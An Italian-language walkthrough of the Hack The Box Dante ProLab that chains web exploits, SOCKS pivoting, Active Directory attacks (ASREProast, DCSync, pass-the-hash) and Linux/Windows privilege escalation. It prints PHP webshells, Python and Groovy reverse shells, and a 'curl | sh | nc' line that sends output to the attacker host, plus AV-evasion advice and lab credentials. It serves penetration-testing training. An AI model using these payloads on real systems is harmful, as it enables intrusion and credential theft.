---
title: 'HTB Dante ProLab Walkthrough: Pivoting Multi-Subnet, Active Directory Attack Chain & Full Privilege Escalation'
slug: htb-proloab-dante
description: 'HTB Dante ProLab walkthrough completo: foothold WordPress, pivoting multi-subnet, Active Directory, DCSync, xp_cmdshell e privilege escalation Windows/Linux.'
image: /dante-walktrough-prolabs.webp
draft: true
date: 2026-04-24T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - hack the box
  - prolabs
  - active-directory
---

> **TL;DR** — HTB Dante ProLab walkthrough completo: WordPress RCE → Linux foothold → pivot 172.16.1.0/24 → SMB leak → LFI chain → Slack creds → Linux root → Webmin RCE → DC MS17-010 → DCSync → second subnet 172.16.2.0/24 → Jenkins → Domain Admin. Se stai preparando OSCP o OSEP, questo è il lab su cui allenarti prima dell'esame.

***

## Dante ProLab: perché è diverso da un CTF — e perché ti serve

Prendi una macchina HTB classica. La bucchi, prendi root, fine.

Dante non funziona così.

Hai una singola macchina esposta su internet. Dentro c'è un'intera rete aziendale — tre subnet, dodici host, due Domain Controller, un mix di Linux e Windows. Per arrivare al Domain Admin devi costruire tunnel sopra tunnel, raccogliere credenziali da pcap e file di log, eseguire attack chain AD reali: ASREProast, DCSync via DACL abuse, Pass-the-Hash. E farlo tutto passando attraverso proxy SOCKS che tu stesso hai costruito.

**È qui che vedi se sai davvero fare pivoting — o se ti sei solo allenato su macchine isolate.**

Questo HTB Dante ProLab walkthrough copre ogni fase: dall'initial access web fino al Domain Admin sulla seconda subnet. Step-by-step, con i comandi reali, le varianti alternative e gli errori tipici che bloccano chi ci lavora per la prima volta.

**Cosa costruisci su questo lab:**

* Initial access via WordPress, LFI-to-RCE con PHP filter chain, SQL injection, file upload
* Pivoting multi-hop con chisel e ligolo-ng su più subnet
* Active Directory attack chain: enumerazione anonima → ASREProast → DACL abuse → DCSync
* Pass-the-Hash e lateral movement su host Windows
* Linux privilege escalation: Python library hijacking, disk group + debugfs, sudo \< 1.8.28 bypass, polkit
* Windows privilege escalation: Unquoted Service Path, SeImpersonatePrivilege (Potato family), service ACL misconfiguration

***

## Dante Attack Chain — Mappa Completa

```
[Internet]
    │
    ▼
10.10.110.100 (DANTE-WEB-NIX01)
WordPress RCE (james:Toyota) → Plugin Editor shell
bash_history leak → balthazar:TheJoker12345!
PwnKit (CVE-2021-4034) → root
    │
    ▼  [chisel/ligolo SOCKS tunnel]
172.16.1.0/24
    ├── NIX02 (.10)  LFI→PHP filter chain RCE → wp-config margaret:Welcome1!2@3#
    │                Slack export → frank:TractorHeadtorchDeskmat
    │                Python lib hijacking (urllib.py) → root
    ├── NIX03 (.17)  pcap → admin:Password6543 → Webmin RCE → root
    ├── DC01  (.20)  MS17-010 (psexec) → SYSTEM
    │                employee_backup.xlsx (19 coppie user:pass)
    │                net user mrb3n → password in Comment → flag
    │                ping sweep → 172.16.2.5 scoperta
    ├── NIX04 (.12)  SQLi blog → MD5 crack ben:Welcometomyblog
    │                sudo -u#-1 /bin/bash → root (CVE sudo<1.8.28)
    ├── WS01  (.13)  Forum upload → webshell → Druva privesc → SYSTEM
    ├── WS02  (.101) FTP dharding:WestminsterOrange5 → hint → spray → WestminsterOrange17
    │                IObitUnSvr service ACL → sc.exe binPath → SYSTEM
    ├── WS03  (.102) Marriage app file upload → blake shell
    │                SeImpersonatePrivilege → getsystem → SYSTEM
    ├── NIX07 (.19)  Jenkins Admin_129834765:SamsungOctober102030
    │                Groovy console → shell → pspy → ian:VPN123ZXC
    │                disk group + debugfs → file read root (flag + shadow)
    └── SQL01 (.5)   Sophie:TerrorInflictPurpleDirt996655 → xp_cmdshell
                     SeImpersonatePrivilege → getsystem → SYSTEM
    │
    ▼  [secondo tunnel su DC01 session]
172.16.2.0/24
    ├── DC02  (.5)   ASREProast jbercov → hashcat → myspace7
    │                evil-winrm → SharpHound → BloodHound
    │                GetChangesAll (DACL abuse) → DCSync → Administrator hash
    │                Pass-the-Hash psexec → SYSTEM
    │                Jenkins.bat → Admin_129834765:SamsungOctober102030
    ├── NIX05 (.101) SSH spray → julian:manchesterunited
    │                traitor polkit:CVE-2021-3560 → root
    └── NIX06 (.6)   SSH spray → plongbottom:PowerfixSaturdayClub777
                     plongbottom in sudoers → sudo su → root
```

***

## Prerequisiti — Tool e Setup per HTB Dante ProLab

**Tool necessari (tutti su Kali/Parrot di default o installabili):**

```bash
# Web
wpscan, gobuster/ffuf, sqlmap, burpsuite, cewl

# Pivoting
chisel, ligolo-ng, proxychains4, metasploit (autoroute + socks_proxy)

# AD
bloodhound-python, sharphound, crackmapexec/netexec, impacket-suite, evil-winrm, kerbrute

# Privesc Linux
linpeas.sh, pspy64, traitor

# Privesc Windows
winPEAS, PowerSharpPack, Get-ServiceAcl.ps1

# Password cracking
hashcat, john, hydra
```

**Contesto iniziale:**

* IP entry point: `10.10.110.100` (esposto su internet)
* Subnet interna 1: `172.16.1.0/24`
* Subnet interna 2: `172.16.2.0/24`
* Dominio AD: `DANTE.local` / `DANTE.ADMIN`

***

## MODULO 1 — Initial Access: WordPress RCE e FTP Recon

### 1.1 Ricognizione iniziale

```bash
sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

Porte aperte:

| Porta | Servizio                       |
| ----- | ------------------------------ |
| 21    | vsftpd 3.0.3 (anonymous login) |
| 22    | OpenSSH 8.2p1                  |
| 65000 | Apache 2.4.41 – WordPress      |

> **⚠️ Nota operativa**: la porta 65000 è non-standard — un nmap di default (`-p 1-1000`) non la vedrebbe mai. Su Dante come in un pentest reale, esegui sempre full-port scan prima di qualsiasi altra cosa.

Il robots.txt espone già il primo flag nella nota del disallow:

```
/wordpress  DANTE{Y0u_Cant_G3t_at_m3_br0!}
```

### 1.2 FTP Anonimo

```bash
ftp 10.10.110.100
# login: anonymous / (vuoto)
```

In `Transfer/Incoming/todo.txt` trovi note operative: WordPress da aggiornare, LFI da rimuovere, password di James da cambiare. **Queste note sono hint espliciti sulle vulnerabilità successive.**

### 1.3 WordPress — Enumerazione e password bruteforce

WPScan è lo strumento standard per l'enumerazione WordPress (vedi la guida su [brute force e enumerazione](https://hackita.it/articoli/brute-force) per la metodologia completa):

```bash
wpscan --url http://10.10.110.100:65000/wordpress --enumerate u,vp,vt
```

Output rilevante:

* WordPress **5.4.1** (vulnerabile)
* Utenti: `admin`, `james`
* XML-RPC abilitato
* Debug log esposto: `/wp-content/debug.log`

Il bruteforce con rockyou su james è lento. Usa **cewl** per generare un dizionario dal sito stesso:

```bash
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
wpscan --url http://10.10.110.100:65000/wordpress -U james -P words.txt
# Password: Toyota
```

> **Perché funziona**: cewl estrae parole dalla pagina — gli admin spesso usano termini legati al contesto del sito. È un vettore sottovalutato.

### 1.4 WordPress — RCE via Plugin Editor

Con accesso admin al pannello WordPress hai più vettori di esecuzione codice (vedi [WordPress Hacking su HackIta](https://hackita.it/articoli/brute-force)). Il Theme Editor è il più ovvio ma è bloccato da WP 4.9+. Il Plugin Editor no.

**Il Theme Editor blocca il salvataggio** (protezione di WP 4.9+). Usa invece il **Plugin Editor**:

```
/wp-admin/plugin-editor.php
```

Modifica `akismet/class.akismet-cli.php`, aggiungi:

```php
eval($_POST["pass"]);
```

Accedi alla shell:

```
http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/class.akismet-cli.php
```

### 1.5 Linux Privesc su NIX01

Dalla webshell ottieni una shell interattiva, poi raccogli informazioni:

```bash
# Linpeas via pipe (nessun file su disco)
curl 10.10.14.X:9999/linpeas.sh | sh | nc 10.10.14.X 9002
```

**Trovato in `.bash_history` di james:**

```bash
mysql -u balthazar -p TheJoker12345!
```

Login SSH con `balthazar:TheJoker12345!` — funziona.

**PwnKit (CVE-2021-4034)** → root immediato:

```bash
./PwnKit
whoami  # root
cat /home/james/flag.txt
cat /root/flag.txt
```

***

## MODULO 2 — First PrivEsc Linux e Pivoting Layer 1 (172.16.1.0/24)

### 2.1 Costruzione del tunnel SOCKS

Il pivoting è la skill che distingue un pentest reale da un CTF isolato. Per la guida completa su setup e troubleshooting vedi [Chisel e tunneling su HackIta](https://hackita.it/articoli/chisel) e [ProxyChains](https://hackita.it/articoli/proxychains).

**Opzione A — chisel (consigliata, più stabile):**

```bash
# Kali (server)
./chisel server -p 12345 --reverse

# Target (client)
./chisel client 10.10.14.X:12345 R:0.0.0.0:1080:socks
```

**Opzione B — metasploit autoroute + socks\_proxy:**

```msf
use multi/manage/autoroute
set session 1
run

use auxiliary/server/socks_proxy
set SRVPORT 9090
run -j
```

Configura `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 1080
```

Usa `p` come alias di `proxychains4 -q` per comodità.

### 2.2 Scan della subnet interna

```bash
# Scan veloce con fscan
fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080

# Porta estesa (include 5985, 5986 WinRM)
p nmap -sT -Pn -p 21,22,80,135,139,443,445,1433,3306,3389,5985,8080,10000 172.16.1.0/24
```

**Host trovati:**

| IP           | Nome           | OS              | Note              |
| ------------ | -------------- | --------------- | ----------------- |
| 172.16.1.5   | DANTE-SQL01    | Windows 2016    | FTP+MSSQL         |
| 172.16.1.10  | DANTE-NIX02    | Linux           | WordPress, LFI    |
| 172.16.1.12  | DANTE-NIX04    | Linux           | XAMPP, blog PHP   |
| 172.16.1.13  | DANTE-WS01     | Windows 10      | XAMPP, forum      |
| 172.16.1.17  | DANTE-NIX03    | Linux           | Webmin 10000      |
| 172.16.1.19  | DANTE-NIX07    | Linux           | Jenkins 8080      |
| 172.16.1.20  | **DANTE-DC01** | Windows 2012 R2 | DC, DANTE.local   |
| 172.16.1.101 | DANTE-WS02     | Windows 10      | FTP+WinRM         |
| 172.16.1.102 | DANTE-WS03     | Windows 10      | IIS, Marriage App |

### 2.3 SMB Enumeration anonima

```bash
p crackmapexec smb 172.16.1.0/24
p crackmapexec smb 172.16.1.0/24 -u anonymous -p '' --shares
```

**Risultati rilevanti:**

* `172.16.1.10` → share `SlackMigration` (READ) → `admintasks.txt`: "WordPress gira come root, account di Margaret ha privilegi admin"
* `172.16.1.17` → share `forensics` (READ/WRITE) → file `monitor` (pcap!)

**Analisi del pcap:**

```bash
file monitor  # pcap capture file
wireshark monitor &
# Filtra: http
# Trovi credenziali: admin:Password6543
```

> **Tecnica ricorrente in OSCP/OSEP**: share SMB accessibili anonimamente con pcap dentro sono una delle fonti di credenziali più sottovalutate. Analizza *sempre* il traffico HTTP non cifrato — basic auth, form POST e cookie di sessione passano in chiaro.

***

## MODULO 3 — Internal Exploitation Chain (Host 172.16.1.x)

### 3.1 DANTE-NIX02 (172.16.1.10) — LFI → RCE

La vulnerabilità di base è una LFI classica tramite path traversal (per approfondire i vettori LFI-to-RCE vedi la guida su [LFI su HackIta](https://hackita.it/articoli/lfi)):

**LFI via path traversal:**

```
http://172.16.1.10/nav.php?page=../../../etc/passwd
```

Utenti shell: `frank`, `margaret`

**Da LFI a RCE — PHP Filter Chain:**

La LFI include file PHP causando errori. Usa `php://filter` per leggere sorgenti:

```
/nav.php?page=php://filter/convert.base64-encode/resource=../../../var/www/html/wordpress/wp-config.php
```

Da `wp-config.php` ottieni: `margaret:Welcome1!2@3#`

Per RCE senza file upload, usa la **PHP filter chain** (tool: [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator)):

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_POST[0]); ?>'
```

Scrivi una webshell — la richiesta POST deve avere `Content-Type: application/x-www-form-urlencoded`:

```
POST /nav.php?page=<chain_lunga>
Content-Type: application/x-www-form-urlencoded

0=echo '<?php eval($_POST["pass"]); ' > /var/www/html/e.php
```

> **Errore comune**: inviare la POST senza Content-Type corretto restituisce output vuoto. Il parametro `0` non viene parsato da PHP come variabile `$_POST` se il body non è form-encoded.

**Privesc a frank — Slack export:**

```bash
# Cerca nella home di frank (shell via webshell)
find /home/frank -name "*.zip" 2>/dev/null
# Trova: Test Workspace Slack export...zip
```

Nel file JSON dei messaggi Slack privati (percorso: `~/.config/Slack/exported_data/secure/2020-05-18.json`) trovi la password reale:

```
frank : TractorHeadtorchDeskmat
```

**Privesc frank → root — Python Library Hijacking:**

```bash
# pspy per trovare cronjob nascosti
./pspy64
# Vedi: root esegue ogni minuto:
# python3 /home/frank/apache_restart.py && rm /home/frank/urllib.py
```

Lo script importa `urllib` dalla directory corrente. Crea `/home/frank/urllib.py` malevolo:

```python
import os,pty,socket
s=socket.socket()
s.connect(("10.10.14.X",9998))
[os.dup2(s.fileno(),f) for f in(0,1,2)]
pty.spawn("/bin/bash")
```

```bash
nc -lvnp 9998
# Aspetta ~1 minuto → shell root
```

> **Perché funziona**: Python cerca i moduli prima nella directory corrente (`sys.path[0]`) poi nei path di sistema. Se hai write nella working directory dello script, vinci. Questa tecnica rientra nella categoria [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc) — una delle più frequenti in ambienti mal gestiti.

***

### 3.2 DANTE-NIX03 (172.16.1.17) — Webmin RCE

Il pcap aveva credenziali `admin:Password6543`. Webmin gira sulla porta 10000.

```bash
p curl -k https://172.16.1.17:10000/
```

**Exploit via MSF:**

```msf
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 172.16.1.17
set USERNAME admin
set PASSWORD Password6543
set LHOST 10.10.14.X
set SSL true
run
# whoami → root
```

> **Nota**: diversi moduli MSF per Webmin falliscono — `webmin_packageup_rce` (≤1.910) è il più affidabile su questa versione.

***

### 3.3 DANTE-DC01 (172.16.1.20) — MS17-010

**Verifica:**

```msf
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.16.1.20
run
# [+] Host is likely VULNERABLE to MS17-010
```

**Exploitation (più stabile di eternalblue):**

```msf
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.20
set LHOST 10.10.14.X
set payload windows/meterpreter/reverse_tcp
run
# SYSTEM shell
```

> **Perché `ms17_010_psexec` e non `eternalblue`**: il modulo eternalblue opera a livello kernel e su Windows Server 2012 R2 può causare BSOD. Il modulo psexec usa EternalRomance/EternalSynergy — più controllato, più stabile. In un lab puoi rischiare, in un assessment reale no.

**Post-exploitation:**

```cmd
net user mrb3n
# Nel campo Comment: password S3kur1ty2020! e flag DANTE{...}
```

Scarica `employee_backup.xlsx` da `C:\Users\katwamba\Desktop\` — contiene \~19 coppie user:password. **Sono le credenziali per gli spray sugli altri host.**

**Scan subnet 172.16.2.0/24 dal DC01:**

```cmd
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
# Reply from 172.16.2.5 → DANTE-DC02!
```

***

## MODULO 4 — Active Directory Attack Chain: ASREProast → DCSync → Domain Admin

### 4.1 Secondo tunnel verso 172.16.2.0/24

DC02 non è raggiungibile direttamente da Kali — è visibile solo da DC01. Devi quindi aggiungere una route *sopra* la sessione esistente su DC01, creando un secondo hop nel tuo stack di pivoting: `Kali → NIX01 → DC01 → DC02`.

Aggiungi route MSF dal meterpreter su DC01:

```msf
meterpreter > run autoroute -s 172.16.2.0/24
```

Oppure deploy di un secondo chisel da DC01:

```cmd
start /b chisel.exe client 10.10.14.X:12345 R:0.0.0.0:1088:socks
```

### 4.2 DANTE-DC02 (172.16.2.5) — ASREProast → DCSync

**Enumera utenti via kerbrute:**

```bash
p -f proxychains_1088.conf kerbrute userenum -d dante --dc 172.16.2.5 users.txt
```

**ASREProast** — attacco Kerberos che non richiede credenziali di dominio, solo raggiungibilità della porta 88 (per la teoria completa vedi la guida [Kerberos: Kerberoasting e ASREProast su HackIta](https://hackita.it/articoli/kerberos)):

```bash
p GetNPUsers.py dante/jbercov -no-pass -dc-ip 172.16.2.5 -outputfile dante_asrep.hash
```

**Crack hash:**

```bash
hashcat -m 18200 dante_asrep.hash /usr/share/wordlists/rockyou.txt
# jbercov : myspace7
```

**Login WinRM:**

```bash
p evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
```

**BloodHound enumeration:**

L'analisi del grafo AD con [BloodHound su HackIta](https://hackita.it/articoli/bloodhound) è il passo che trasforma credenziali low-priv in un percorso verso il Domain Admin:

```powershell
# Su evil-winrm
upload SharpHound.exe
.\SharpHound.exe -c All
download 20240101_BloodHound.zip
```

Importa in BloodHound → jbercov ha **GetChangesAll** sul dominio → DCSync possibile senza essere DA.

La misconfigura GetChangesAll è un caso di [DACL abuse in Active Directory](https://hackita.it/articoli/active-directory) — un vettore spesso ignorato in assessment reali.

**DCSync** (vedi la guida completa su [DCSync su HackIta](https://hackita.it/articoli/dcsync)):

```bash
p secretsdump.py DANTE.ADMIN/jbercov:myspace7@172.16.2.5
# Administrator:500:aad3b435...:4c827b7074e99eefd49d05872185f7f8:::
```

**Pass-the-Hash → SYSTEM su DC02** (tecnica dettagliata nella guida [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash)):

```bash
p psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8' \
  'DANTE.ADMIN/Administrator@172.16.2.5'
```

> In `C:\Users\Administrator\Documents\Jenkins.bat` trovi `Admin_129834765:SamsungOctober102030` → credenziali Jenkins su NIX07.

***

## MODULO 5 — Linux/Windows PrivEsc: Tecniche su Host Rimanenti 172.16.1.x

### 5.1 DANTE-WS01 (172.16.1.13) — File Upload RCE + AV Bypass

Forum PHP vulnerabile a upload non filtrato (CVE noto su "Online Discussion Forum Site 1.0"). Il filtro estensioni è assente. Vedi la guida [File Upload Attack su HackIta](https://hackita.it/articoli/file-upload-attack) per i vettori di bypass più comuni.

Carica webshell **Godzilla** (modalità PHP\_XOR\_BASE64) invece di un semplice `eval($_POST)`:

```
Godzilla → Add → PHP → PHP_XOR_BASE64 → password: pass → Generate
```

> **Perché Godzilla e non una webshell base**: le webshell con `eval($_POST)` in chiaro vengono rilevate da qualsiasi AV per firma statica. Godzilla XOR+Base64 cifra il traffico e non ha pattern riconoscibili a riposo. Su WS01 c'è un AV attivo — una `<?php system($_GET['cmd']); ?>` viene killata al primo accesso.

Post foothold: esegui meterpreter reverse HTTPS per persistenza, poi:

```msf
use exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc
set session <id>
run
# SYSTEM
```

***

### 5.2 DANTE-NIX04 (172.16.1.12) — SQL Injection → root

La vulnerabilità è una classica SQL injection su parametro GET — vedi la guida [SQL Injection su HackIta](https://hackita.it/articoli/sql-injection) per la metodologia completa con sqlmap:

```bash
p sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch \
  --proxy socks5://localhost:1080
# Database: flag → DANTE{wHy_y0U_n0_s3cURe?!?!}
```

Dump `membership_users`, cracking MD5 di `ben` → `Welcometomyblog`

SSH come ben, poi **sudo bypass** (sudo \< 1.8.28):

```bash
sudo -u#-1 /bin/bash
# root immediato — il UID -1 viene interpretato come 0
```

***

### 5.3 DANTE-WS02 (172.16.1.101) — Service ACL Misconfiguration

FTP bruteforce → `dharding:WestminsterOrange5`

La nota in FTP dice "stessa password ma numero diverso da 5". Genera lista e spray SMB:

```bash
for i in {0..99}; do echo "WestminsterOrange$i"; done > pass_variations.txt
p crackmapexec smb 172.16.1.101 -u dharding -P pass_variations.txt
# dharding:WestminsterOrange17 ✓
```

WinRM (5985) — vedi [Evil-WinRM: guida completa](https://hackita.it/articoli/evilwinrm) per opzioni avanzate:

```bash
p evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17
```

**Service ACL misconfiguration su IObitUnSvr:**

```powershell
"IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access
# dharding ha ChangeConfig → modifica binPath
```

```cmd
sc.exe stop IObitUnSvr
sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\runme.bat"
sc.exe start IObitUnSvr
# Shell come SYSTEM
```

***

### 5.4 DANTE-WS03 (172.16.1.102) — SeImpersonatePrivilege (Potato family)

File upload non autenticato su "Online Marriage Registration System" — stesso vettore di WS01, ma senza AV attivo. Carica una webshell standard o un payload msfvenom direttamente (vedi [File Upload Attack](https://hackita.it/articoli/file-upload-attack)).

L'utente blake ottiene una shell come `NETWORK SERVICE` con `SeImpersonatePrivilege`. Su qualsiasi account Windows con questo privilegio, la Potato family funziona — qui usi il metodo più rapido disponibile in MSF:

```msf
meterpreter > getsystem
# Named Pipe Impersonation (PrintSpooler variant) → SYSTEM
```

***

### 5.5 DANTE-NIX07 (172.16.1.19) — Jenkins → disk group

Login Jenkins con `Admin_129834765:SamsungOctober102030`.

**Script Console (Groovy) → shell:**

```groovy
String host="10.10.14.X"
int port=9898
String cmd="bash"
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s=new Socket(host,port)
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()
OutputStream po=p.getOutputStream(),so=s.getOutputStream()
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read())
  while(pe.available()>0)so.write(pe.read())
  while(si.available()>0)po.write(si.read())
  so.flush();po.flush();Thread.sleep(50)
  try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();s.close()
```

**pspy per credenziali in chiaro:**

```bash
./pspy64
# CMD: mysql -u ian -p VPN123ZXC
```

Su ian: **disk group → debugfs lettura arbitraria:**

```bash
debugfs /dev/sda5
# debugfs: cat /root/flag.txt
# debugfs: cat /etc/shadow
```

> **Alternativa root**: traitor con `polkit:CVE-2021-3560` funziona su quasi tutti gli host Linux del lab — ma è meno formativo di capire il root cause.

***

### 5.6 DANTE-SQL01 (172.16.1.5) — MSSQL xp\_cmdshell

Credenziali SQL trovate su NIX06: `Sophie:TerrorInflictPurpleDirt996655`

Connessione e abuso di xp\_cmdshell — tecnica coperta nella guida [MSSQL porta 1433 su HackIta](https://hackita.it/articoli/porta-1433-mssql):

```bash
p mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
```

```sql
EXEC xp_cmdshell 'whoami'
-- nt service\mssql$sqlexpress
EXEC xp_cmdshell 'net user'
```

**Reverse shell via MSF:**

```msf
use exploit/windows/mssql/mssql_payload
set RHOST 172.16.1.5
set USERNAME Sophie
set PASSWORD TerrorInflictPurpleDirt996655
run
# meterpreter → getsystem → SYSTEM (PrintSpooler)
```

***

## MODULO 6 — Second Pivot e Lateral Movement Finale (172.16.2.x)

### 6.1 DANTE-ADMIN-NIX05/06 (172.16.2.101 / 172.16.2.6) — SSH Spray + Sudo PrivEsc

Le credenziali di `julian` e `plongbottom` vengono dall'`employee_backup.xlsx` trovato su DC01 e dal crack dello shadow di NIX04. Questo è il pattern centrale di Dante: **le credenziali si accumulano e si riusano tra host e subnet diverse**.

SSH bruteforce con il file combinato di tutte le credenziali raccolte finora:

```msf
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE combine.txt   # user:pass separati da spazio
set RHOSTS 172.16.2.101
set THREADS 10
run
# julian:manchesterunited ✓
```

Su NIX06, `plongbottom` è nel gruppo `sudo` → escalation immediata:

```bash
sudo su
# root — nessun exploit necessario
```

> **Lezione**: non tutti i privesc richiedono CVE. Un utente in sudoers con password nota è root senza toccare nessun exploit.

***

## Miglioramenti Tecnici — Come Fare Dante Più Stealth e Stabile

### Pivoting con ligolo-ng (alternativa superiore a chisel)

Rispetto a chisel, ligolo-ng usa un vero TUN interface — niente proxychains, tutto il tool stack funziona nativamente:

```bash
# Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Target
./agent -connect 10.10.14.X:11601 -ignore-cert

# Su proxy console
session → 1
start --tun ligolo
# Aggiungi route subnet interna
sudo ip route add 172.16.1.0/24 dev ligolo
```

Per più subnet (Dante ne ha 2+) crei un'interfaccia TUN per ogni hop:

```bash
# Seconda interfaccia per 172.16.2.0/24
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.2.0/24 dev ligolo2
# Sul proxy ligolo: start --tun ligolo2 (nel secondo listener)
```

> Con ligolo-ng puoi usare `nmap`, `impacket`, `evil-winrm` e qualsiasi tool direttamente — niente prefisso `proxychains`, niente problemi con UDP.

### Errori comuni su Dante

| Errore                          | Causa                                      | Fix                                 |
| ------------------------------- | ------------------------------------------ | ----------------------------------- |
| chisel si disconnette           | Timeout / firewall                         | `--keepalive 10s`                   |
| bloodhound-python fallisce LDAP | Kerberos non raggiungibile via socks (UDP) | Aggiungi `--dns-tcp`                |
| MSF meterpreter muore           | Shell non stabile                          | Migra processo subito dopo apertura |
| fscan non vede 5985             | Porta non nel preset                       | Usa lista porte estesa `-p`         |
| evil-winrm lento                | Proxychains overhead                       | Usa `-S` per SSL se disponibile     |
| john non cracka shadow          | Formato errato                             | Specifica `--format=md5crypt-long`  |

### Alternative più stealth ai tool usati

| Tool rumoroso                | Alternativa stealth                     |
| ---------------------------- | --------------------------------------- |
| msfvenom payload .exe        | Custom loader + shellcode cifrato       |
| linpeas.sh (scrive su disco) | `curl ... \| sh` — nessun file su disco |
| SharpHound.exe               | `bloodhound-python` da Kali via proxy   |
| Metasploit autoroute         | ligolo-ng (meno traffic anomaly)        |

***

## Lateral Movement Summary — Credential Map Completa

Tutte le credenziali raccolte durante il lab, in ordine di scoperta.

| Utente               | Password / Hash                    | Origine                     | Usata su              |
| -------------------- | ---------------------------------- | --------------------------- | --------------------- |
| james (WP)           | Toyota                             | cewl bruteforce             | WordPress admin       |
| balthazar            | TheJoker12345!                     | bash\_history di james      | SSH NIX01             |
| margaret             | Welcome1!2\@3#                     | wp-config via LFI           | —                     |
| frank                | TractorHeadtorchDeskmat            | Slack export (JSON cifrato) | SSH NIX02             |
| admin (Webmin)       | Password6543                       | pcap monitor.pcap           | Webmin NIX03          |
| mrb3n                | S3kur1ty2020!                      | net user Comment DC01       | dominio DANTE.local   |
| dharding             | WestminsterOrange17                | FTP hint + spray SMB        | WinRM WS02            |
| julian               | manchesterunited                   | /etc/shadow crack (john)    | SSH NIX04/NIX05/NIX06 |
| ben                  | Welcometomyblog                    | MD5 crack da DB blog        | SSH NIX04             |
| Admin\_129834765     | SamsungOctober102030               | Jenkins.bat su DC02         | Jenkins NIX07         |
| ian                  | VPN123ZXC                          | pspy (crontab in chiaro)    | NIX07 lateral         |
| Sophie               | TerrorInflictPurpleDirt996655      | file SQL su NIX06           | MSSQL SQL01           |
| jbercov              | myspace7                           | ASREProast + hashcat        | evil-winrm DC02       |
| Administrator (DC02) | `4c827b7074e99eefd49d05872185f7f8` | DCSync                      | PTH psexec DC02       |

> **Pattern ricorrente su Dante**: ogni host lascia credenziali per il prossimo. La metodologia vincente è raccogliere tutto, anche quello che sembra inutile.

***

## Conclusione — HTB Dante ProLab: vale davvero la pena?

Sì, se stai preparando OSCP o OSEP.

Dante non è un lab da finire in un weekend. È una simulazione realistica di pentest su infrastruttura mista, e ti costringe a costruire skill che le singole macchine non ti danno: gestione di tunnel instabili, credential reuse sistematico tra host, Active Directory attack chain end-to-end.

Le cinque cose che questo walkthrough ti deve aver fatto capire:

1. **Enumeration prima di tutto** — SMB anonimo, FTP, pcap, note operative dimenticate in giro. I vettori sono già lì, li devi solo trovare.
2. **Il pivoting è infrastruttura, non un trucco** — senza tunnel stabili (chisel o ligolo-ng) non raggiungi nessuna subnet interna. È la skill più sottovalutata nei lab entry-level.
3. **Ogni host ha le chiavi del prossimo** — la credential map sopra lo dimostra. Raccogli tutto, anche quello che sembra inutile adesso.
4. **AD è un grafo, non una lista di host** — BloodHound ti mostra in 10 secondi il path che impiegheresti ore a trovare manualmente. GetChangesAll su un utente low-priv è DCSync. Senza BloodHound non lo vedresti mai.
5. **Linux privesc spesso è banale** — disk group, sudo vecchio, crontab con library hijacking. Cerca prima le cose semplici, non il kernel exploit.

Se vuoi approfondire i singoli vettori usati in questo walkthrough, parti dalla guida [Active Directory attack chain](https://hackita.it/articoli/active-directory) e dalla sezione [pivoting con ligolo-ng](https://hackita.it/articoli/chisel) — sono le due aree dove Dante ti allena di più.

***

*Articolo prodotto da HackIta — hackita.it | Errori, varianti o aggiunte? Scrivici.*
